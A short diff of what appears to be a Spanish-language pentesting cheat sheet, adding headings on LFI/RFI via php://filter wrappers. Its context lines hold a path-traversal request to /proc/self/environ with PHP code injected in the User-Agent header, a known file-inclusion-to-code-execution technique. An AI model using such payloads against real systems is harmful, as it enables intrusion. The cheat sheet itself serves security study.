@@ -1780,6 +1780,10 @@ GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
 
+#### LFI RFI Using Wrappers
+
+##### Wrapper php://filter
+
 #### SQLI
 
 Ejemplo básico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3
